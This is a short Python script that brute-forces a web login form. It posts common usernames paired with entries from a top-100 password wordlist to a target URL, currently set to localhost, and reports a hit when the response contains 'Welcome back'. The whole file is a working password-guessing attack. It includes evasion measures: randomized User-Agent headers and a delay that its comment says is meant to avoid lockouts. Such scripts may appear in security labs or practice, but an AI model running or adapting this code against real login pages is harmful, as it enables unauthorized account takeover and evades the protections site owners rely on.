import requests
import sys
import time
import random

target = "http://127.0.0.1:5000" 
usernames = ["admin", "user", "test"]
passwords_file = "top-100.txt"
needle = "Welcome back"

# Common User-Agent strings
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (Android 10; Mobile; rv:68.0)",
]

for username in usernames:
    with open(passwords_file, "r") as passwords_list:
        for password in passwords_list:
            password = password.strip()

            # Random User-Agent
            headers = {
                "User-Agent": random.choice(user_agents)
            }

            sys.stdout.write(f"[X] Attempting user:password -> {username}:{password}\r")
            sys.stdout.flush()
            
            try:
                r = requests.post(target, data={"username": username, "password": password}, headers=headers)

                if needle in r.text:
                    print(f"\n[>>>>>] Valid password '{password}' found for user '{username}'!")
                    sys.exit()
            except requests.exceptions.RequestException as e:
                print(f"\n[ERROR] Request failed: {e}")
                sys.exit(1)
            
            time.sleep(0.5)  # Delay to avoid lockouts

    print(f"\n\t[!] No valid password found for '{username}'\n")
